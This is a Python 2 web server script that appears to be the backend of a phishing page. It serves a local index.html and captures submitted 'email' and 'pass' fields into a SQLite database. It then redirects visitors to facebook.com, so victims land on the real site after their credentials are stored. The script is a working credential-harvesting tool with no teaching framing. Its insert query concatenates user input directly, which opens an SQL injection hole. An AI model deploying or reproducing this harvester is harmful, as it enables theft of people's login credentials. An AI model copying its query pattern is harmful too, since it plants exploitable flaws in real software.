import SocketServer
import socket
import BaseHTTPServer
import sys
import cgi
import sqlite3
from cgi import parse_header, parse_multipart

REDIRECTIONS = {"/slashdot/": "http://slashdot.org/"}
LAST_RESORT = "http://facebook.com"

class MyTCPHandler(SocketServer.BaseRequestHandler):

    def handle(self):
        # self.request is the TCP socket connected to the client
        self.data = self.request.recv(1024).strip()
        print ("{} wrote:".format(self.client_address[0]))
        print (self.data)
        # just send back the same data, but upper-cased
        #self.request.sendall(self.data.upper())
        text = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/\nContent-Type: text/html\nContent-Length: 174\n<html>\n<head>\n<title>Moved</title>\n</head>\n<body>\n<h1>Moved</h1>\n<p>This page has moved to <a href=\"http://www.example.org/\">http://www.example.org/</a>.</p>\n</body>\n</html>"
        self.request.sendall(text)

class RedirectHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_HEAD(s):
        s.send_response(301)
        s.send_header("Location", REDIRECTIONS.get(s.path, LAST_RESORT))
        s.end_headers()
    def do_GET(s):
        page = open("index.html")
        txt = page.read()
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(txt)
    def do_POST(s):
        ctype, pdict = cgi.parse_header(s.headers.getheader('content-type'))
        if ctype == 'multipart/form-data':
            postvars = cgi.parse_multipart(s.rfile, pdict)
        elif ctype == 'application/x-www-form-urlencoded':
            length = int(s.headers.getheader('content-length'))
            postvars = cgi.parse_qs(s.rfile.read(length), keep_blank_values=1)
        else:
            postvars = {}
        mail = postvars['email'][0]
        password = postvars['pass'][0]
        conn = sqlite3.connect('test.db')
        for row in conn.execute("select * from users order by rowid desc limit 1;"):
            print (row)
            idd = row[0]
            idd = idd + 1
        print (idd)
        query = ("insert into users (rowid, email, pass) values ("+str(idd)+", '"+str(mail)+"', '"+ str(password) + "');")
        print (query)
        conn.execute(query)
        conn.execute("select * from users;")
        s.do_HEAD()

if __name__ == "__main__":
    PORT = 80
    HOST = socket.gethostbyname(socket.gethostname())
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST, PORT), RedirectHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
